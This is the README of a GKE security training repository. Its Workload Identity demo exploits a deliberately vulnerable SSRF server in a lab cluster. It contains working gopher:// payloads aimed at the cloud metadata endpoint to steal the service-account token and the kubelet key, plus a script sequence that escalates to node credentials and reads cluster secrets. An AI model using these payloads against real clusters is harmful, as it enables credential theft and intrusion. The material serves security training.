# training-gke-security
This repository is for training of GKE Security

[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/training-gke-security&page=editor&cloudshell_tutorial=README.md)

### Preparation
- Set project id
```bash
gcloud config set project PROJECT_ID
```

- Enable GKE API
```bash
gcloud services enable container.googleapis.com
```

- Create GKE Cluster
```bash
gcloud container clusters create gke-security-testing --zone us-central1-a --machine-type g1-small --num-nodes 3 --async
```

- Get a credential of GKE
```bash
gcloud container clusters get-credentials gke-security-testing --zone=us-central1-a
```

- Testing
```
kubectl get node
```

### Demo 1: PodSecurityPolicy
- Apply k8s manifest and run
- See credentials

- How to block

### Demo 2: Workload Identity
- Apply k8s manifest
```
kubectl apply -f manifest -R
```
(Please don't expose deployment on the Internet through Service.)

- Port-forward
```
kubectl port-forward deployment/ssrf-server 8080:8080
```

- Open Web Preview
<img src="img/web-preview.png" width="320">

- Input url (for testing)
```
https://www.google.com
```

- Input malicious url
  - Get instance token (doesn't use it in this training)
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```

  - Get kubelet key
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-env?alt=json HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```
It contains "KUBELET_KEY".

- ctrl+A and store all result to `metadata_exploit/metadata.txt` file
TODO: ADD image

- store
```bash
cd metadata_exploit

# Extract necessary data from metadata
bash extract.sh
ls -l metadata

# Get node permission
bash exploit.sh $(cat metadata/nodename)

# Set env vars
KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)"
echo $KUBE_OPT

# Get secretName
kubectl describe pod | grep secret

# Get secret
kubectl get secret dummy-secret -o yaml
```

### (After this training) Clean cluster
```bash
gcloud container clusters delete gke-security-testing --zone us-central1-a --async
```

## References
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
- [Hacking Kubelet on Google Kubernetes Engine](https://www.4armed.com/blog/hacking-kubelet-on-gke/)
- [The Path Less Traveled: Abusing Kubernetes Defaults](https://speakerdeck.com/iancoldwater/the-path-less-traveled-abusing-kubernetes-defaults)
